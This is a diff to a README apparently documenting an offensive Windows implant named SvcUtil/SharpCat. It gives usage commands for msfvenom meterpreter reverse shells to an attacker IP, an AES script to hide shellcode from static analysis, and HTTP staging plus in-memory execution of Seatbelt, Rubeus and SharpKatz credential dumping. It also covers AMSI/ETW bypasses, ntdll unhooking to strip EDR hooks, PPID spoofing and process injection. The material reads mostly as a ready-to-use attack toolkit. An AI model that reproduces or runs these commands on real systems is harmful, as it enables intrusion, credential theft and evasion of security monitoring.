@@ -25,6 +25,84 @@ dotnet build -c Release
 
 ---
 
+## Payload Preparation
+
+### Generate base64 from shellcode
+
+```bash
+# 1. Generate raw shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.1 LPORT=443 -f raw -o payload.bin
+
+# 2. Convert to base64 (Linux)
+base64 -w0 payload.bin > shellcode.txt
+
+# 2. Convert to base64 (Windows PowerShell)
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.bin")) | Out-File shellcode.txt -NoNewline
+
+# 3. Use with SvcUtil
+SvcUtil.exe -s shellcode.txt
+```
+
+> **Tip:** `-s` accepts a file path or a base64 string directly. If the argument is an existing file, SvcUtil reads its content. Otherwise it treats it as raw base64.
+
+### Create AES encrypted payload (.enc)
+
+AES encryption hides shellcode from static analysis. Format: AES-256-CBC, key = SHA256(password), output = IV(16 bytes) + ciphertext.
+
+**encrypt.py** — save this script alongside your payloads:
+
+```python
+#!/usr/bin/env python3
+"""Encrypt a payload for SvcUtil -s <file> -p <password>"""
+import sys, os, hashlib, base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+def encrypt(infile, password, outfile=None):
+    key = hashlib.sha256(password.encode()).digest()
+    iv = os.urandom(16)
+    with open(infile, 'rb') as f:
+        data = f.read()
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ct = cipher.encrypt(pad(data, 16))
+    result = base64.b64encode(iv + ct).decode()
+
+    out = outfile or infile.rsplit('.', 1)[0] + '.enc'
+    with open(out, 'w') as f:
+        f.write(result)
+    print(f"[+] {len(data)} bytes -> {out} (AES-CBC, SHA256 key)")
+
+if __name__ == '__main__':
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <payload.bin> <password> [output.enc]")
+        sys.exit(1)
+    encrypt(sys.argv[1], sys.argv[2],
+            sys.argv[3] if len(sys.argv) > 3 else None)
+```
+
+```bash
+# Encrypt
+pip install pycryptodome
+python3 encrypt.py payload.bin MyP@ssw0rd
+
+# Use with SvcUtil
+SvcUtil.exe -s payload.enc -p MyP@ssw0rd
+```
+
+### Prepare .NET assembly for --exec-asm
+
+```bash
+# Compile your tool or use a pre-built one (Seatbelt, Rubeus, etc.)
+# Convert to base64
+base64 -w0 Seatbelt.exe > seatbelt.b64
+
+# Or AES encrypt it
+python3 encrypt.py Seatbelt.exe MyP@ssw0rd seatbelt.enc
+```
+
+---
+
 ## 1. Listener (Attacker Side)
 
 `listener.py` is the dedicated listener with XOR encryption and TLS support. It replaces nc/ncat for encrypted sessions.
@@ -193,20 +271,7 @@ SvcUtil.exe -c 10.10.10.5 4444
 
 **Theory:** Executes shellcode in the current process using W^X (Write-then-Execute) technique. Memory is allocated as RW, shellcode is copied in, then protection is changed to RX. This avoids having RWX memory pages, which is a common detection indicator. Shellcode is zeroed from managed memory after execution (anti-forensics).
 
-### Step 1: Generate shellcode
-
-```bash
-# Meterpreter reverse TCP (x64)
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=10.10.14.1 LPORT=443 -f raw -o payload.bin
-
-# Convert to base64
-base64 -w0 payload.bin > shellcode.txt
-cat shellcode.txt
-# Output: /EiD5PDowAAAAEFR... (long base64 string)
-```
-
-### Step 2a: Execute directly (base64 on command line)
+### Execute directly (base64 on command line)
 
 ```bash
 # Start Metasploit handler first
@@ -216,35 +281,21 @@ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter
 SvcUtil.exe -s /EiD5PDowAAAAEFR...
 ```
 
-### Step 2b: Execute from file (for long shellcode)
+### Execute from file (for long shellcode)
 
 ```bash
-# Target — load base64 from file (much easier for long payloads)
+# Target — load base64 from file
 SvcUtil.exe -s shellcode.txt
 ```
-
-> **Tip:** If the argument to `-s` is an existing file path, SvcUtil reads the base64 content from that file. Otherwise it treats the argument as the base64 string itself.
 
 ### With AES encryption (bypass static analysis)
 
 ```bash
-# Encrypt the shellcode with a password
-python3 -c "
-import base64, hashlib, os
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-
-key = hashlib.sha256(b'MyPassword123').digest()
-iv = os.urandom(16)
-with open('payload.bin','rb') as f: sc = f.read()
-cipher = AES.new(key, AES.MODE_CBC, iv)
-ct = cipher.encrypt(pad(sc, 16))
-# Output: IV + ciphertext, base64 encoded
-print(base64.b64encode(iv + ct).decode())
-" > encrypted.txt
+# Encrypt (see Payload Preparation section above)
+python3 encrypt.py payload.bin MyP@ssw0rd
 
 # Target — decrypt and execute
-SvcUtil.exe -s encrypted.txt -p MyPassword123
+SvcUtil.exe -s payload.enc -p MyP@ssw0rd
 ```
 
 ### Skip sandbox checks (for testing/debugging)
@@ -321,28 +372,6 @@ SvcUtil.exe -i explorer -s encrypted.txt -p MyPassword123
 
 **Theory:** Loads a .NET assembly (EXE) entirely in memory without touching disk. The assembly is transferred over the encrypted channel, loaded via `Assembly.Load(byte[])` in the SharpCat process, and its `Main()` is invoked with optional arguments. Because SharpCat's process already has AMSI and ETW patched, the loaded assembly is invisible to both — equivalent to Sliver's `execute-assembly` or Havoc's `dotnet inline-execute`, but without needing a full C2 framework.
 
-```
-  [Attacker]                              [Target]
-  listener.py                             SvcUtil.exe (shell session)
-      │                                       │
-      │  !localexec SharpKatz.exe --Command   │
-      │         logonpasswords                │
-      ├──────────────────────────────────────►│
-      │  !execute-assembly 45678 --Command    │
-      │         logonpasswords                │
-      │                                       ├─ AMSI/ETW already patched
-      │  READY                                │
-      │◄──────────────────────────────────────┤
-      │  <45678 bytes of assembly>            │
-      ├──────────────────────────────────────►│
-      │                                       ├─ Assembly.Load(bytes)
-      │                                       ├─ EntryPoint.Invoke(args)
-      │  [captured stdout/stderr output]      │
-      │◄──────────────────────────────────────┤
-      │  DONE: assembly executed successfully │
-      │◄──────────────────────────────────────┤
-```
-
 ### From the listener (recommended)
 
 ```bash
@@ -366,9 +395,52 @@ SvcUtil.exe -i explorer -s encrypted.txt -p MyPassword123
 # Receive: output + DONE/ERR
 ```
 
+### Standalone mode (--exec-asm)
+
+Load and run a .NET assembly without a shell session — useful for one-shot execution:
+
+```bash
+# Basic: load from base64 file, no arguments to assembly
+SvcUtil.exe --exec-asm -s seatbelt.b64
+
+# With AES decryption
+SvcUtil.exe --exec-asm -s seatbelt.enc -p MyP@ssw0rd
+
+# Stage from HTTP
+SvcUtil.exe --exec-asm --stage-http http://10.10.14.1/seatbelt.b64
+
+# Stage from named pipe
+SvcUtil.exe --exec-asm --stage-pipe mypipe
+```
+
+**Passing arguments to the assembly** — use `--` to separate SvcUtil flags from assembly arguments:
+
+```bash
+# Everything after -- is passed to the assembly's Main(string[] args)
+SvcUtil.exe --exec-asm -s seatbelt.b64 -- -group=all
+SvcUtil.exe --exec-asm -s rubeus.enc -p MyP@ssw0rd -- triage
+SvcUtil.exe --exec-asm -s sharpkatz.b64 -- --Command logonpasswords
+```
+
+In the examples above:
+- `--exec-asm` tells SvcUtil to load the payload as a .NET assembly (not shellcode)
+- `-s` / `-p` / `--stage-http` / `--stage-pipe` specify where and how to get the assembly bytes
+- `--` marks the end of SvcUtil flags
+- Everything after `--` becomes `args` in `Main(string[] args)` of the loaded assembly
+
+```
+  SvcUtil.exe --exec-asm -s rubeus.enc -p Pass123 -- triage
+  │                                                    │
+  │  SvcUtil flags                                     │  Assembly args
+  │  --exec-asm    = load as .NET assembly             │  triage = passed to
+  │  -s rubeus.enc = AES encrypted base64 source       │  Rubeus.Main(["triage"])
+  │  -p Pass123    = AES decryption password           │
+  └────────────────────────────────────────────────────┘
+```
+
 ### Key advantages over PowerShell reflection
 
-| | `!localexec` | PowerShell `Assembly.Load` |
+| | `!localexec` / `--exec-asm` | PowerShell `Assembly.Load` |
 |---|---|---|
 | Disk touch | None | None |
 | AMSI | Pre-patched in process | Must bypass separately |
@@ -380,59 +452,45 @@ SvcUtil.exe -i explorer -s encrypted.txt -p MyPassword123
 
 ---
 
-## 9. AMSI/ETW Bypass (How It Works)
+## 9. Evasion Flags
 
-**Theory:** When `-e powershell.exe` is used, SvcUtil automatically bypasses AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows) to prevent Defender from scanning PowerShell commands and receiving telemetry events.
+### --amsi — Advanced AMSI/ETW Bypass
 
-### Bypass Flow
+Combines two techniques in a single flag:
 
-```
-  SvcUtil.exe spawns powershell.exe directly (no CREATE_SUSPENDED)
-      │
-      ├─ Step 1: Patch EtwEventWrite in ntdll.dll with RET (0xC3)
-      │          → Defender stops receiving ETW events
-      │
-      ├─ Step 2: Patch AmsiScanBuffer in current process
-      │          → xor eax,eax; ret (returns S_OK, "clean")
-      │
-      ├─ Step 3: Wait for PowerShell to initialize (~500ms)
-      │
-      ├─ Step 4: Send bypass commands via stdin (one line at a time):
-      │          $c1=-join([char[]](83,121,115,...))     ← type name
-      │          $c2=-join([char[]](97,109,115,...))     ← field name
-      │          $r=[type]('R'+'ef')                    ← get Reflection
-      │          $a=$r.Assembly                         ← get assembly
-      │          $t=$a.GetType($c1)                     ← get AmsiUtils
-      │          $t.GetField($c2,40).SetValue($null,$true)  ← set amsiInitFailed
-      │
-      ├─ Step 5: Drain pipe buffer
-      │          → discard PowerShell banner + bypass command echoes
-      │          → listener sees clean prompt only
-      │
-      └─ Result: PowerShell has AMSI disabled, clean output
+1. **ETW patch** — patches `EtwEventWrite` in ntdll.dll with `RET` (0xC3). Defender and EDR stop receiving ETW events from this process.
+2. **HW breakpoint AMSI bypass** — sets a hardware breakpoint (DR0) on `AmsiScanBuffer` via a Vectored Exception Handler (VEH). When AMSI calls `AmsiScanBuffer`, the breakpoint fires, VEH sets the return value to `AMSI_RESULT_CLEAN` and skips the function.
+
+```bash
+# Shell mode — apply before spawning cmd/powershell
+SvcUtil.exe -c 10.10.14.1 4444 --amsi
+
+# Standalone assembly execution — apply before Assembly.Load
+SvcUtil.exe --exec-asm -s tool.b64 --amsi -- -group=all
 ```
 
-### Why Direct Spawn + Stdin Reflection Works
+Hardware breakpoint is superior to memory patching (`xor eax,eax; ret` on amsi.dll) because:
+- No code modification on amsi.dll — integrity checks pass
+- No `PAGE_EXECUTE_READWRITE` on amsi.dll — no suspicious VirtualProtect calls
+- Uses CPU debug registers (DR0-DR3) — transparent to userland hooks
 
-Defender detects based on **behavioral patterns**, not static binary analysis:
+### --unhook — Ntdll Unhooking
 
-- `CREATE_SUSPENDED` + cross-process `NtProtectVirtualMemory`/`NtWriteVirtualMemory` = classic process injection pattern → **always detected**
-- Direct spawn (no `CREATE_SUSPENDED`) + stdin-only bypass = **normal parent-child relationship** — no suspicious memory operations
-- Each bypass command line is **individually harmless** to AMSI scanning (char code arrays, string concatenation)
-- Pipe buffer drain after bypass removes banner + command echoes — listener output is clean
+Restores the clean `.text` section of ntdll.dll from the on-disk copy in `System32`. This removes ALL inline hooks that EDR places on Nt* functions.
 
-### Anti-Detection Techniques
+```bash
+# Shell mode
+SvcUtil.exe -c 10.10.14.1 4444 --unhook
 
-| Technique | Purpose |
-|-----------|---------|
-| Runtime patch construction | `xor eax,eax; ret` bytes built via arithmetic at runtime — no static `{ 0x31, 0xC0, 0xC3 }` array in binary |
-| `[MethodImpl(NoInlining)]` | Prevents compiler from inlining the zero-byte generator function |
-| `Environment.TickCount - TickCount` | Always equals 0, but static analysis can't resolve it |
-| `[type]('R'+'ef')` | String concatenation avoids AMSI pattern matching on `[Ref]` |
-| Char code arrays | Type/field names built from integer arrays, not string literals |
-| Pipe drain after bypass | Discards PowerShell banner + bypass command echoes from output |
-| XOR-encoded strings | All sensitive strings (amsi.dll, AmsiScanBuffer, etc.) stored as XOR byte arrays |
-| No cross-process writes | Entire bypass via stdin pipe — no suspicious memory operations |
+# Combined with AMSI bypass (maximum evasion)
+SvcUtil.exe -c 10.10.14.1 4444 --amsi --unhook
+```
+
+The recommended order for maximum bypass: ntdll unhooking runs first (restores clean syscall stubs), then ETW patch + AMSI bypass apply on the clean ntdll.
+
+### Auto AMSI bypass (no flag needed)
+
+When `-e powershell.exe` is used, SvcUtil automatically applies AMSI/ETW bypass via stdin reflection — no `--amsi` flag needed. The `--amsi` flag adds the more advanced HW breakpoint technique on top.
 
 ---
 
@@ -447,13 +505,19 @@ Defender detects based on **behavioral patterns**, not static binary analysis:
 | `-k key` | XOR traffic encryption key (must match listener) |
 | `-r` | Auto-reconnect on disconnect (exponential backoff + jitter) |
 | `-n` | No encryption (plaintext) |
-| `-a` | Force AMSI/ETW bypass |
-| `--no-amsi` | Disable auto AMSI bypass |
 | `--tls` | Use TLS instead of XOR |
-| `-s base64\|file` | Shellcode: base64 string or path to file containing base64 |
-| `-p password` | AES decryption password for shellcode |
-| `-i pid\|name` | Target for injection: PID number or process name (e.g. `notepad`) |
+| `-s base64\|file` | Payload source: base64 string or file path |
+| `-p password` | AES decryption password for payload |
+| `--stage-http url` | Download payload from HTTP URL |
+| `--stage-pipe name` | Read payload from named pipe |
+| `--exec-asm` | Treat payload as .NET assembly (not shellcode) |
+| `--` | Separator: everything after is passed to assembly's Main() |
+| `-a` / `--amsi` | ETW patch + HW breakpoint AMSI bypass |
+| `--unhook` | Restore clean ntdll.dll (remove EDR hooks) |
 | `--no-sandbox` | Skip sandbox evasion checks |
+| `-i pid\|name` | Target for injection: PID or process name |
+| `--thread-inject` | Use thread injection instead of thread hijacking |
+| `--ppid pid\|name` | PPID spoofing: create child under specified parent |
 
 ---
 
@@ -466,22 +530,29 @@ Program.cs           Entry point, argument parsing, mode dispatch
 ├── Connection.cs    TCP connectivity: reverse, bind, reconnect with exponential backoff
 │
 ├── Shell Mode
-│   ├── Shell.cs           Process spawn with piped stdin/stdout/stderr
+│   ├── Shell.cs           Per-command execution loop with piped stdout/stderr
 │   ├── IShellStream.cs    Interface for polymorphic stream handling
 │   ├── Crypto.cs          XOR rolling-key stream cipher
 │   ├── TlsStream.cs       SslStream wrapper — real TLS 1.2/1.3
 │   ├── FileTransfer.cs    !upload / !download protocol
-│   ├── AssemblyRunner.cs  !execute-assembly — in-memory .NET assembly loader
+│   ├── AssemblyRunner.cs  !execute-assembly — in-memory .NET assembly loader (shell)
 │   └── ScanPatch.cs       AMSI/ETW bypass (local patch + stdin reflection)
+│
+├── Evasion
+│   ├── AmsiHwBp.cs        HW breakpoint AMSI bypass (VEH + DR0)
+│   ├── NtdllUnhook.cs     Ntdll .text section restore from disk
+│   └── Stager.cs          HTTP / named pipe payload staging
 │
 ├── Shellcode Mode
 │   ├── AesCrypto.cs       AES-CBC payload encryption/decryption
+│   ├── AsmExec.cs         Standalone .NET assembly execution (--exec-asm)
 │   ├── PayloadRunner.cs   W^X local shellcode execution
 │   ├── EnvCheck.cs        5-gate sandbox/emulator detection
 │   ├── Syscall.cs         Indirect syscall engine (SSN + gadget jump)
 │   └── RemoteLoader.cs    Thread hijacking via indirect syscalls
 │
 ├── listener.py      Python listener with XOR/TLS support
+├── encrypt.py       AES payload encryption script
 └── build.bat        Build script (csc.exe, no SDK needed)
 ```
 
@@ -489,16 +560,17 @@ Program.cs           Entry point, argument parsing, mode dispatch
 
 | Technique | Module | How it works |
 |-----------|--------|--------------|
-| Execute-Assembly | AssemblyRunner.cs | In-memory .NET assembly load via `Assembly.Load(byte[])` — no disk, no PowerShell |
+| HW Breakpoint AMSI | AmsiHwBp.cs | VEH + DR0 on AmsiScanBuffer — no code modification, no VirtualProtect |
+| ETW Patch | ScanPatch.cs | Patch EtwEventWrite with RET — disable ETW telemetry |
+| Ntdll Unhooking | NtdllUnhook.cs | Restore clean .text from disk ntdll — remove ALL EDR inline hooks |
+| Execute-Assembly | AssemblyRunner.cs, AsmExec.cs | In-memory .NET assembly load via `Assembly.Load(byte[])` — no disk, no PowerShell |
 | Dynamic P/Invoke | DynInvoke.cs | Only LoadLibraryA/GetProcAddress in IAT — all other APIs resolved at runtime |
 | Indirect Syscalls | Syscall.cs | SSN from clean disk ntdll + jump through in-memory `syscall;ret` gadget |
 | Threadless Injection | RemoteLoader.cs | Thread execution hijacking — no CreateRemoteThread call |
 | W^X Shellcode | PayloadRunner.cs | Allocate RW, copy, change to RX — never RWX |
-| AMSI Bypass | ScanPatch.cs | Local AmsiScanBuffer patch + stdin reflection bypass in PowerShell |
-| ETW Bypass | ScanPatch.cs | Patch EtwEventWrite with RET before AMSI bypass |
-| Pipe Drain | Shell.cs | Discard bypass command echoes — clean listener output |
-| Runtime Patch | ScanPatch.cs | Patch bytes built at runtime via arithmetic — no static byte arrays |
+| Stdin AMSI Bypass | ScanPatch.cs | Auto AMSI bypass for PowerShell via stdin reflection |
 | AES Payload Encryption | AesCrypto.cs | AES-CBC with SHA256 key derivation — shellcode encrypted at rest |
+| HTTP/Pipe Staging | Stager.cs | Download payload from HTTP or named pipe — no base64 on command line |
 | Sandbox Evasion | EnvCheck.cs | Sleep timing, VirtualAllocExNuma, FlsAlloc, CPU count, uptime |
 | TLS Encryption | TlsStream.cs | Real TLS — traffic indistinguishable from HTTPS |
 | XOR String Obfuscation | All files | All sensitive strings stored as pre-computed XOR byte arrays |
